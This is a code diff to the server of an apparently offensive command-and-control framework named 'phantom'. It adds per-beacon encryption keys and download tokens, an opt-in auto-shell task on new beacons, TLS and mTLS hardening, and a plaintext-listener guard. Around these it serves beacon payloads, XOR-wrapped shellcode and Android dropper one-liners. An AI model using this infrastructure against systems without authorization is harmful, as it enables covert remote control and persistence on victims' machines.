@@ -32,8 +32,15 @@ from dotenv import load_dotenv
 from phantom.core.logger import logger
 from phantom.utils.c2_crypto import (
     get_payload_token,
+    # Re-exported: the deployment-key primitives are still the public API for
+    # callers that are not tied to one beacon identity, and existing imports
+    # (`from phantom.core.c2_server import encrypt_data`) must keep working.
     encrypt_data,
     decrypt_data,
+    # Beacon-facing traffic uses the per-beacon key instead.
+    encrypt_for_beacon,
+    decrypt_for_beacon,
+    get_beacon_download_tokens,
     get_api_token,
 )
 from phantom.utils.paths import certs_dir, certs_exist
@@ -61,6 +68,25 @@ def _auto_persist_allowed() -> bool:
                             env="PHANTOM_AUTO_PERSIST")
     except Exception:
         return True
+
+
+def _auto_shell_allowed() -> bool:
+    """9.3: auto-open shell is an ENGAGEMENT GRANT, default OFF.
+
+    Auto-open shell means: on a beacon's FIRST check-in the server queues
+    ONE harmless `health` task, so the operator is handed a live console
+    with evidence the task channel works, instead of clicking through the
+    UI to find out. It is off by default (a new beacon must not receive
+    unsolicited tasks), overridable per engagement via `c2.auto_shell` in
+    data/config.json or PHANTOM_AUTO_SHELL=1, and every automatic queue is
+    written to the audit chain.
+    """
+    try:
+        from phantom.utils import config as cfg
+        return cfg.get_bool("c2.auto_shell", False,
+                            env="PHANTOM_AUTO_SHELL")
+    except Exception:
+        return False
 
 
 class TaskPolicyError(PermissionError):
@@ -97,6 +123,21 @@ class C2State:
         # session is a time-boxed capability grant with its own revocation,
         # so a leaked dropper URL is useless after the window closes.
         self.remote_sessions: dict[str, dict[str, Any]] = {}
+        # 9.3: hand the operator a live console on a new beacon (one
+        # `health` task). Off by default — see `_auto_shell_allowed` —
+        # and togglable at runtime from the UI/API.
+        self.auto_shell: bool = _auto_shell_allowed()
+
+    def set_auto_shell(self, enabled: bool) -> bool:
+        """Turn auto-open shell on/off for this run (audited)."""
+        self.auto_shell = bool(enabled)
+        logger.info(f"Auto-shell {'ENABLED' if self.auto_shell else 'disabled'}")
+        try:
+            from phantom.utils.audit_log import audit_log
+            audit_log.append("auto_shell_toggled", enabled=self.auto_shell)
+        except Exception:
+            pass
+        return self.auto_shell
 
     # ── remote session grants (Review-3) ───────────────────────────────
 
@@ -261,6 +302,24 @@ class C2State:
                 # immutable audit log with the chosen method so an operator
                 # reviewing the chain sees the side effect, not just the
                 # registration.
+                # AUTO-OPEN SHELL (9.3): the operator asked to be handed a
+                # live console the moment a beacon lands. ONE harmless
+                # `health` task, queued FIRST (before the auto-persist the
+                # block below may add), for a NEW beacon only — a session
+                # resume keeps its preserved queue and gets nothing.
+                if self.auto_shell:
+                    task_id = self._new_task_id()
+                    self.tasks[beacon_id].append({"task_id": task_id,
+                                                  "command": "health"})
+                    logger.info(f"Auto-shell (health) queued for new beacon "
+                                f"{beacon_id} (Task: {task_id})")
+                    try:
+                        from phantom.utils.audit_log import audit_log
+                        audit_log.append("auto_shell_queued",
+                                         beacon_id=beacon_id,
+                                         task_id=task_id)
+                    except Exception:
+                        pass
                 os_type = info.get("os", "").lower()
                 method = "runkey" if "windows" in os_type else "systemd"
                 # Review-4: the shortcut stays (owner decision Q-1) but is now
@@ -845,7 +904,10 @@ async def handle_checkin(request: web.Request, pre_body: Optional[str] = None) -
             return web.Response(status=401, text="Unauthorized")
 
         if encrypted_body:
-            decrypted_body = decrypt_data(encrypted_body)
+            # PER-BEACON envelope key: derived from THIS identity's HMAC
+            # secret (falling back to the deployment key for beacons built
+            # before per-beacon derivation).
+            decrypted_body = decrypt_for_beacon(encrypted_body, beacon_id)
             if decrypted_body:
                 try:
                     data = json.loads(decrypted_body)
@@ -876,7 +938,8 @@ async def handle_checkin(request: web.Request, pre_body: Optional[str] = None) -
 
         pending = c2_state.get_pending_tasks(beacon_id)
         response_data = json.dumps({"tasks": pending})
-        encrypted_response = encrypt_data(response_data)
+        # Seal with the key THIS beacon derives, or the tasks never open.
+        encrypted_response = encrypt_for_beacon(response_data, beacon_id)
 
         return web.Response(text=encrypted_response, content_type="text/plain")
     except Exception as e:
@@ -896,7 +959,7 @@ async def handle_result(request: web.Request, pre_body: Optional[str] = None) ->
         if not c2_state.authenticate_beacon(request, encrypted_body):
             logger.warning(f"Unauthenticated result rejected for {beacon_id}")
             return web.Response(status=401, text="Unauthorized")
-        decrypted_body = decrypt_data(encrypted_body)
+        decrypted_body = decrypt_for_beacon(encrypted_body, beacon_id)
 
         if not decrypted_body:
             logger.warning(f"Result decryption failed from beacon {beacon_id}")
@@ -959,6 +1022,31 @@ def payload_download_name(path: str) -> str:
     return _PAYLOAD_DOWNLOADS.get(path, "payload.bin")
 
 
+def _payload_token_ok(request: web.Request) -> bool:
+    """May this caller fetch a payload?
+
+    Two credentials are accepted. The deployment-wide PHANTOM_PAYLOAD_TOKEN
+    stays valid for beacons built before per-beacon tokens and for the
+    operator's own curl one-liners. A PER-BEACON token is derived from the
+    identity carried in X-Beacon-Id — which the beacon already sends on every
+    payload-fetch route — so a captured enrolled binary authorises only its
+    own download. Fresh builds carry no deployment token at all.
+    """
+    token = (request.headers.get("X-Auth-Token")
+             or request.query.get("auth") or "")
+    if not token:
+        return False
+    if hmac.compare_digest(token.encode(), get_payload_token().encode()):
+        return True
+    beacon_id = request.headers.get("X-Beacon-Id", "")
+    if not beacon_id:
+        return False
+    for candidate in get_beacon_download_tokens(beacon_id):
+        if candidate and hmac.compare_digest(token.encode(), candidate.encode()):
+            return True
+    return False
+
+
 async def handle_payload(request: web.Request) -> web.Response:
     """GET /api/v1/payload[_<platform>] — Serves the compiled beacon binary.
 
@@ -968,12 +1056,7 @@ async def handle_payload(request: web.Request) -> web.Response:
     (query strings leak into proxy logs, history and telemetry)."""
     try:
         import os
-        # Always get current token from utility to stay in sync
-        current_auth_token = get_payload_token()
-
-        token = request.headers.get("X-Auth-Token") or request.query.get("auth")
-        global_ok = hmac.compare_digest((token or "").encode(),
-                                        current_auth_token.encode())
+        token_ok = _payload_token_ok(request)
         is_remote = request.path.startswith("/api/v1/remote_payload")
 
         # Review-3: the Remote Session module is a TIME-BOXED capability.
@@ -989,7 +1072,7 @@ async def handle_payload(request: web.Request) -> web.Response:
             strict = os.getenv("PHANTOM_REMOTE_STRICT", "0") not in (
                 "0", "", "false", "False")
             if not sess_ok:
-                if strict or not global_ok:
+                if strict or not token_ok:
                     logger.warning(
                         f"Remote payload refused from {request.remote}: {why}")
                     try:
@@ -1003,7 +1086,7 @@ async def handle_payload(request: web.Request) -> web.Response:
                     f"DEPRECATED: remote payload served with the GLOBAL "
                     f"payload token to {request.remote} — use a session token "
                     f"('remote-deploy' issues one automatically)")
-        elif not global_ok:
+        elif not token_ok:
             logger.warning(f"Unauthorized payload request from {request.remote}")
             return web.Response(status=403, text="Forbidden: Invalid auth token")
         elif not request.headers.get("X-Auth-Token"):
@@ -1071,9 +1154,7 @@ async def handle_payload(request: web.Request) -> web.Response:
 async def handle_android_stager(request: web.Request) -> web.Response:
     """GET /s/android — Return a one-liner only to an authenticated caller."""
     try:
-        token = request.query.get("auth") or request.headers.get("X-Auth-Token")
-        if not hmac.compare_digest((token or "").encode(),
-                                   get_payload_token().encode()):
+        if not _payload_token_ok(request):
             return web.Response(status=403, text="Forbidden: Invalid auth token")
         from phantom.utils.builder import generate_dropper
         host = server_instance.host if server_instance.host != "0.0.0.0" else request.headers.get("Host", request.url.host)
@@ -1081,7 +1162,8 @@ async def handle_android_stager(request: web.Request) -> web.Response:
             host = host.split(":")[0]
         port = server_instance.port or request.url.port or 80
         use_ssl = request.scheme == "https"
-        script = generate_dropper("android", host, port, use_ssl=use_ssl)
+        script = generate_dropper("android", host, port, use_ssl=use_ssl,
+                                  resilient=True)
         return web.Response(text=script, content_type="text/plain")
     except Exception as e:
         logger.error(f"Android stager error: {e}")
@@ -1091,9 +1173,7 @@ async def handle_android_stager(request: web.Request) -> web.Response:
 async def handle_payload_pic(request: web.Request) -> web.Response:
     """GET /x — Serve the authenticated XOR-wrapped PIC payload."""
     try:
-        token = request.query.get("auth") or request.headers.get("X-Auth-Token")
-        if not hmac.compare_digest((token or "").encode(),
-                                   get_payload_token().encode()):
+        if not _payload_token_ok(request):
             logger.warning(f"Unauthorized PIC payload request from {request.remote}")
             return web.Response(status=403, text="Forbidden: Invalid auth token")
         payload_path = os.path.join(os.path.dirname(__file__), "..", "payloads", "beacon", "beacon_xored.bin")
@@ -1165,7 +1245,8 @@ async def handle_beacon_any(request: web.Request) -> web.Response:
         pass
     try:
         if body_text:
-            decrypted = decrypt_data(body_text)
+            decrypted = decrypt_for_beacon(
+                body_text, request.headers.get("X-Beacon-Id", ""))
             if decrypted and "task_id" in decrypted:
                 return await handle_result(request, pre_body=body_text)
     except Exception:
@@ -1202,6 +1283,40 @@ def server_site_host() -> str:
     except Exception:
         pass
     return ""
+
+
+def _mtls_require_client_cert() -> bool:
+    """True when the listener demands a client certificate (default)."""
+    try:
+        from phantom.utils import config as cfg
+        return cfg.get_bool("c2.mtls_require_client_cert", True,
+                            env="PHANTOM_MTLS_REQUIRE_CLIENT_CERT")
+    except Exception:
+        return True
+
+
+def _plaintext_allowed() -> bool:
+    """True when the operator explicitly accepted a plaintext C2."""
+    try:
+        from phantom.utils import config as cfg
+        return cfg.get_bool("c2.allow_plaintext", False,
+                            env="PHANTOM_ALLOW_PLAINTEXT")
+    except Exception:
+        return False
+
+
+def listener_bind_host() -> str:
+    """The address the listener BINDS (config `c2.bind`, default 0.0.0.0)."""
+    try:
+        from phantom.utils import config as cfg
+        return cfg.get_str("c2.bind", "0.0.0.0",
+                           env="PHANTOM_C2_BIND") or "0.0.0.0"
+    except Exception:
+        return "0.0.0.0"
+
+
+def _is_loopback_host(host: str) -> bool:
+    return (host or "").strip().lower() in ("127.0.0.1", "::1", "localhost")
 
 
 class C2Server:
@@ -1310,6 +1425,20 @@ class C2Server:
 
         try:
             context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+            # HARDENING: an explicit TLS 1.2 floor (a bare PROTOCOL_TLS_SERVER
+            # already defaults there on modern Python, but the guarantee must
+            # not depend on the interpreter's defaults) and a modern AEAD
+            # cipher policy. No NULL/MD5/DSS suites can be negotiated.
+            try:
+                context.minimum_version = ssl.TLSVersion.TLSv1_2
+            except (AttributeError, ValueError):
+                pass
+            try:
+                context.set_ciphers(
+                    "ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM"
+                    ":!aNULL:!MD5:!DSS:!RC4:!3DES")
+            except ssl.SSLError:
+                pass
             context.load_cert_chain(cert_path, key_path)
             if mtls_on:
                 ca_path = os.getenv("PHANTOM_MTLS_CA", "").strip()
@@ -1319,8 +1448,21 @@ class C2Server:
                     logger.error("mTLS is enabled but the client CA is missing")
                     return None
                 context.load_verify_locations(cafile=ca_path)
-                context.verify_mode = ssl.CERT_OPTIONAL
-                logger.info("mTLS client-certificate verification enabled (CERT_OPTIONAL)")
+                # REQUIRED by default: a client without a certificate cannot
+                # finish the handshake. CERT_OPTIONAL let anyone talk TLS to
+                # the C2 and rely on the app-layer HMAC alone — the operator
+                # who wants that legacy posture sets
+                # c2.mtls_require_client_cert=false (doctor flags it).
+                if _mtls_require_client_cert():
+                    context.verify_mode = ssl.CERT_REQUIRED
+                    logger.info("mTLS client-certificate verification enabled "
+                                "(CERT_REQUIRED)")
+                else:
+                    context.verify_mode = ssl.CERT_OPTIONAL
+                    logger.warning(
+                        "mTLS client certificates are OPTIONAL "
+                        "(c2.mtls_require_client_cert=false): authentication "
+                        "rests on the app-layer HMAC only")
             return context
         except Exception as e:
             logger.error(f"Failed to load SSL certificates: {e}")
@@ -1382,6 +1524,28 @@ class C2Server:
 
         # Re-create app inside the loop thread
         self.app = self._setup_app()
+
+        # PLAINTEXT GUARD: a clear-text listener on a non-loopback bind is a
+        # C2 any on-path observer can read and hijack. Refuse it unless the
+        # operator explicitly opted in (c2.allow_plaintext) — silence here
+        # would be the worst outcome, so the refusal names the exact key.
+        if not self.use_ssl and not _is_loopback_host(self.host):
+            if not _plaintext_allowed():
+                msg = (f"refusing a PLAINTEXT C2 on {self.host}:{self.port} — "
+                       "anyone on the path could read and hijack it. Enable "
+                       "TLS (default) or, for a lab only, set "
+                       "c2.allow_plaintext=true")
+                logger.error(msg)
+                self.bind_error = msg
+                self.loop.run_until_complete(self.app.shutdown())
+                self.loop.run_until_complete(self.app.cleanup())
+                self.loop.stop()
+                _signal()
+                return
+            logger.warning(
+                "PLAINTEXT C2 listener on %s:%s (c2.allow_plaintext=true): "
+                "traffic is readable and modifiable in transit",
+                self.host, self.port)
 
         # Determine if we should use SSL
         self.ssl_context = self._get_ssl_context()
